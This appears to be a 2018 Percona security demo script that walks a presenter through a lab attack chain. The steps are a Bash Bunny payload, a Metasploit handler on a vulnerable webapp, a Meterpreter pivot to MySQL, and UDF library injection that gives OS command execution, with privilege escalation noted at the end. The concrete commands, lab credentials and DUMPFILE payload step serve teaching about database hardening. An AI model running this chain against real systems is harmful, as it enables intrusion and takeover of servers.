.. Copyright 2018 Percona LLC / David Busby

#. Bashbunny payload as written will work on Kali / debian Linux desktop running Gnome, ducky_script.txt will need changing for your environment if this differs.
#. Load the bashbunny with bashbunny/payloads/switch1/*
#. `sync` && eject bashbunny
#. Unplug bashbunny, slide switch to position 1
#. re-plug bashbunny, allow to run light will show green when done.
#. Now we should be at the point of MSFconsole running `exploit` to start the multi/handler
#. in a new tab `curl -skv http://172.16.33.2/vuln_webapp/images.php 2>/dev/null &`
#. msfconsole _should_ get a new session
#. You may want to demonstrate you can not reach 3306/tcp on 172.16.33.3 at this point e.g. `nc -v 172.16.33.3 3306`
#. In msfconsole run: `portfwd add -l 3306 -p 3306 -r 172.16.33.3`
#. You may wish to explain this has setup the webserver as a pivot to reach the DB service. `[You] -> [WebServer] -> [MySQL server 3306/tcp]`
#. Use credentials from `cat sqli.php` on webserver meterepter session; to run on the CnC / localhost `mysql -uvuln_webapp -ppluk` in a new tab
#. In mysql run the following `show grants(); select whomami();` discuss how ALL privleges is bad, cover FILE, CREATE_ROUTINE etc.
#. In new tab settup a listener with netcat `nc -l 11457`
#. Head back to mysql client tab
#. mysql -h 127.0.0.1 -u vuln_webapp -ppluk vuln_webapp < udf_51.sql 
#. mysql -h 127.0.0.1 -u vuln_webapp -ppluk vuln_webapp -e "SELECT @@GLOBAL.plugin_dir" 
#. mysql -h 127.0.0.1 -u vuln_webapp -ppluk vuln_webapp -e "SELECT payload FROM udf_stager INTO DUMPFILE '/usr/lib64/mysql/plugin/lib_mysqludf_sys.so'"
#. mysql -h 127.0.0.1 -u vuln_webapp -ppluk vuln_webapp < udf_functions.sql
#. Within mysql client tab execute `SELECT sys_eval("id"), sys_eval("sestatus"), sys_eval("ls -al /usr/lib64/mysql/");` discuss the caveats of each result.
#. VMs run an old kernel, priv escalation at this point should be trivial using existing exploitation vectors
